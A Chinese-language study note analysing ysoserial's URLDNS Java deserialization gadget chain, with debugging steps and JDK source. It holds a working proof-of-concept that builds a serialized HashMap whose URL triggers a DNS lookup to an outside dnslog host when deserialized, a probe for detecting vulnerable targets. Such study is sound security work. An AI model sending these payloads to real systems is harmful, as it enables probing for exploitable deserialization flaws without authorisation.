# URLDNS链分析

urldns是`ysoserial` 中的一个利用链,并不像cc链那样是一个第三方组件

urldns的优势:

- 不限制jdk版本，使用Java内置类，对第三方依赖没有要求
- 目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞
- URLDNS利用链，只能发起DNS请求，并不能进行其他利用

在ysoserial中给出的gadget:

```java
*   Gadget Chain:
 *     HashMap.readObject()
 *       HashMap.putVal()
 *         HashMap.hash()
 *           URL.hashCode()
```

## 分析

调试时使用的poc

```java
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

public class test03 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
        
        HashMap hashMap = new HashMap();
        Class<?> aClass = Class.forName("java.net.URL");
        Constructor<?> constructor = aClass.getConstructor(String.class);
        URL url = (URL) constructor.newInstance("http://fe228e81.ipv6.1433.eu.org.");
				//获取URL类中的hashCode属性
        Field hashCode = aClass.getDeclaredField("hashCode");
				//绕过权限限制
        hashCode.setAccessible(true);
				//设置hashCode的值
        hashCode.set(url,123);
				//添加到HashMap中
        hashMap.put(url,123);
				//设置hashCode的值
        hashCode.set(url,-1);

        FileOutputStream fileOutputStream = new FileOutputStream("./urldns.ser");
        ObjectOutputStream outputStream = new ObjectOutputStream(fileOutputStream);

        outputStream.writeObject(hashMap);
        outputStream.close();
        fileOutputStream.close();

        FileInputStream fileInputStream = new FileInputStream("./urldns.ser");
        ObjectInputStream inputStream = new ObjectInputStream(fileInputStream);
        inputStream.readObject();
        inputStream.close();
        fileInputStream.close();

    }
}
```

1. 为什么需要两次赋值URL中的hashCode属性

第一次赋值,为了防止在序列化前就发送dnslog请求

当没有改变hashCode属性时,部分代码:

```java
				HashMap hashMap = new HashMap();

        Class<?> aClass = Class.forName("java.net.URL");
        Constructor<?> constructor = aClass.getConstructor(String.class);
        URL url = (URL) constructor.newInstance("http://91197edd.ipv6.1433.eu.org");

        Field hashCode = aClass.getDeclaredField("hashCode");
        hashCode.setAccessible(true);
//        hashCode.set(url,-1);
        System.out.println(url.hashCode());
        hashMap.put(url,123);
```

在URL#hashCode方法中打断点

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled.png)

hashCode的初始值还是为-1

继续调试

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%201.png)

`handler` 在下面赋值

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%202.png)

URLStreamHandler

<aside>
⚠️ 在编程中，transient关键字通常用于Java中的对象序列化。它用于指示某个成员变量不应该被序列化，即在将对象写入文件或网络传输时，该成员变量的值不应该被保存。这通常用于指定敏感信息，如密码或加密密钥，以防止它们被意外地保存或传输。在其他编程语言中也可能会有类似的用法。重新生成



跟入URLStreamHandler#hashCode方法,传入this参数

```java
protected int hashCode(URL u) {
        int h = 0;

        // Generate the protocol part.
        String protocol = u.getProtocol();
        if (protocol != null)
            h += protocol.hashCode();

        // Generate the host part.
        InetAddress addr = getHostAddress(u);
        if (addr != null) {
            h += addr.hashCode();
        } else {
            String host = u.getHost();
            if (host != null)
                h += host.toLowerCase().hashCode();
        }

        // Generate the file part.
        String file = u.getFile();
        if (file != null)
            h += file.hashCode();

        // Generate the port part.
        if (u.getPort() == -1)
            h += getDefaultPort();
        else
            h += u.getPort();

        // Generate the ref part.
        String ref = u.getRef();
        if (ref != null)
            h += ref.hashCode();

        return h;
    }
```

这里就是请求dns了

1. 序列化后

这里序列化的是一个`HashMap`对象,只有一对键值对,键为URL对象,里面的链接为dnslog地址,值为随意

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%203.png)

在readObject打断点,跟进去的是HashMap里的readObject方法

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%204.png)

跟到下面位置

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%205.png)

进入到hash函数

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%206.png)

这里的Object参数就是URL对象

在这里调用的就是URL#hashCode方法

继续跟进

![Untitled](URLDNS%E9%93%BE%E5%88%86%E6%9E%90%2027a14799139b4b108cfb60b9ff46a64f/Untitled%207.png)

由于这里的hashCode属性通过反射设置过值为-1,所以会进入到handler.hashCode函数中,这就跟上面一样了